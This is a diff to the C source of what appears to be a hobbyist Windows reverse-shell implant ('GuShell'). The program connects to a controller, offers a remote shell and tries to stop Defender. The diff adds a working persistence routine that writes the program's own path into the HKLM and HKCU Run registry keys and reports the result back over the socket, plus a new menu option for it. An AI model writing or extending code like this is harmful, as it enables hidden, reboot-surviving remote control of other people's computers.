@@ -7,6 +7,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <process.h>
+#include <sys/types.h>
 
 
 #define PORT "5000"
@@ -27,6 +28,7 @@ int main(int argc, char* argv[]);
 SOCKET connectToServer();
 void startShellProcess(SOCKET* pSockfd, PROCESS_INFORMATION* pPinfo);
 void attemptDefeatDefender(SOCKET* pSockfd);
+void attemptRegistryPersistence(SOCKET* pSockfd);
 void cleanManagerInput(char* command, size_t size);
 
 SOCKET connectToServer() {
@@ -117,6 +119,68 @@ void attemptDefeatDefender(SOCKET* pSockfd) {
 	return;
 }
 
+//Attempts to add autostart to both the local machine and current user keys
+void attemptRegistryPersistence(SOCKET* pSockfd) {
+	TCHAR dirName[100];
+	DWORD charsWritten;
+	HKEY key;
+	LSTATUS rv;
+
+	char failedSys[] = "Failed to add value to system registry tree, trying user.\n";
+	char gotSys[] = "Success with System Key!\n";
+
+	char failedUser[] = "Failed to add value to system registry tree, failed persistence.\n";
+	char gotUser[] = "Success with User Key!\n";
+	
+	// oh my god. I cannot explain how much I hate this function. This line.
+	// I have spent two hours trying to figure out why it was able to print the directory but failed to
+	// go to the registry, infact it showed up in the registry in chinese. It took me TWO HOURS to realize
+	// (after looking at the raw binary of a correct registry entry), that the registry uses 2 byte wide characters.
+	// I was using GetModuleFileNameA, which as the name clearly states DOES NOT OUTPUT WIDE CHARACTERS.
+	GetModuleFileNameW(NULL, dirName, 100);
+
+	//printf(dirName); <--- so that I remember the pain, THIS PRINTS CHARS!!! THATS WHY IT WORKED!!! THEY'RE NOT WIDE!!!
+	
+	if ((rv = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key)) != ERROR_SUCCESS) {
+		send(*pSockfd, failedSys, sizeof failedSys, 0);
+	}
+
+	if (rv == ERROR_SUCCESS) {
+		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
+		if (RegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
+			send(*pSockfd, failedUser, sizeof failedUser, 0);
+			RegCloseKey(key);
+		}
+		else {
+			RegCloseKey(key);
+			send(*pSockfd, gotSys, sizeof gotSys, 0);
+			return;
+		}
+	}
+
+	// Now attempt user.
+
+	// HERE IS WHERE I ATTEMPTED 2 HOURS OF POINTLESS FIXES.
+
+	if ((rv = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key)) != ERROR_SUCCESS) {
+		send(*pSockfd, failedUser, sizeof failedUser, 0);
+	}
+
+	if (rv == ERROR_SUCCESS) {
+		// We are using a wide string here, which is two bytes so *2. Include null terminator with +1.
+		if (RegSetValueExW(key, L"GuShell", 0, REG_SZ, (LPBYTE)dirName, (lstrlen(dirName) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
+			send(*pSockfd, failedUser, sizeof failedUser, 0);
+		}
+		else {
+			send(*pSockfd, gotUser, sizeof gotUser, 0);
+		}
+	}
+
+	RegCloseKey(key);
+
+	return;
+}
+
 // Cleaning up some stuff
 void cleanManagerInput(char* command, size_t size) {
 
@@ -139,9 +203,10 @@ int main(int argc, char* argv[]) {
 
 	SOCKET sockfd;
 
-	char commandList[] = 
+	char commandList[] =
 		"1. Drop into a shell\n"
-		"2. Attempt to stop defender\n";
+		"2. Attempt to stop defender\n"
+		"3. Attempt registry persistence.\n";
 	
 	char commandOpt[50];
 	PROCESS_INFORMATION pinfo;
@@ -166,6 +231,11 @@ int main(int argc, char* argv[]) {
 
 		if (strcmp(commandOpt, "2") == 0) {
 			attemptDefeatDefender(&sockfd);
+			continue;
+		}
+
+		if (strcmp(commandOpt, "3") == 0) {
+			attemptRegistryPersistence(&sockfd);
 			continue;
 		}
 
